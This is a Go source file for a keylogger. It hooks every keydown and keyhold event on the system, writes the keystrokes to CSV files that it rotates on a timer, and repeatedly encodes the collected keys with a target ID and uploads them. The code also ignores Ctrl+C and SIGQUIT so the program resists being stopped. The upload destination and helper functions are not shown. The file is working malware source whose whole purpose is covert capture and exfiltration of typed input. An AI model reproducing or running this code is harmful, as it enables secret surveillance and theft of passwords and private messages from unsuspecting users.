package main

import (
	"encoding/csv"
	"os"
	"os/signal"
	"syscall"
	"time"

	hook "github.com/robotn/gohook"
)

// Prevents termination of the program when `SIGINT` or `SIGQUIT` is received
func preventSigintTermination() {
	// create a channel for OS signals
	sigchan := make(chan os.Signal, 1)
	// notify when `SIGINT` or `SIGQUIT` occur
	signal.Notify(sigchan, syscall.SIGINT, syscall.SIGQUIT)

	go func() {
		// this goroutine prevents exiting the program when Ctrl + C is pressed

		for {
			// read from `sigchan`
			<-sigchan
			// ignore the signal (do nothing)
		}
	}()
}

// Cleans up resources when `SIGTERM` is received and exits gracefully
func cleanupOnSigterm(file *os.File, writer *csv.Writer) {
	// create a channel for OS signals
	sigchan := make(chan os.Signal, 1)
	// notify only when `SIGTERM` occurs
	signal.Notify(sigchan, syscall.SIGTERM)

	go func() {
		// this goroutine prevents exiting the program when Ctrl + C is pressed

		for {
			// read from `sigchan`
			<-sigchan

			// clean up the resources
			if file != nil {
				file.Close()
			}
			if writer != nil {
				writer.Flush()
			}
		}
	}()
}

func main() {
	preventSigintTermination()
	initializeRawcodeMap()

	// initialize important variables
	var csvFileName = getNewCSVFileName()
	var file *os.File = nil
	var writer *csv.Writer = nil
	var keys KeyboardDataStruct = KeyboardDataStruct{
		Contents: []string{},
	}

	// implement graceful exit
	cleanupOnSigterm(file, writer)

	// resource cleanup (on exit)
	defer func() {
		if file != nil {
			file.Close()
		}
	}()
	defer func() {
		if writer != nil {
			writer.Flush()
		}
	}()

	go recoverer(-1, 1, func() {
		for {
			// previous resource cleanup
			if file != nil {
				file.Close()
			}
			if writer != nil {
				writer.Flush()
			}

			// update the variable to contain the name of the new CSV file
			csvFileName = getNewCSVFileName()
			// open the new file and create a writer for it
			file, writer = openNewCSVFile(csvFileName)

			// cycle the CSV file every `<CYCLE_TIME>`
			time.Sleep(CYCLE_TIME)
		}
	})

	go recoverer(-1, 2, func() {
		eventsChannel := hook.Start()
		defer hook.End()

		// TODO: log initial state of lock keys
		for event := range eventsChannel {
			// do things based on the event kind

			if event.Kind == hook.KeyDown {
				// keydown event

				// get `value` from the rawcode map
				value, ok := RAWCODE_MAP_FULL[uint16(event.Rawcode)]
				if !ok {
					// value didn't exist in the map
					// value is probably alphanumeric
					// convert `event.Keychar` to string to get the value
					value = string(rune(event.Keychar))
				}

				writeToLocalStruct(event, value, &keys)
				writeDataToDisk(event, value, writer)
			} else if event.Kind == hook.KeyUp {
				// TODO: implement this later(?)
				// idk what would even go here
			} else if event.Kind == hook.KeyHold {
				// keyhold event

				// get `value` from the rawcode map
				value, ok := RAWCODE_MAP[event.Rawcode]
				if ok {
					writeToLocalStruct(event, value, &keys)
					writeDataToDisk(event, value, writer)
				}
			}
		}
	})

	go recoverer(-1, 3, func() {
		for {
			encodedData := encodeUploadData(keys, getTargetID())
			uploadData(encodedData)
			keys.Contents = []string{}

			time.Sleep(CYCLE_TIME)
		}
	})

	// hang
	select {}
}
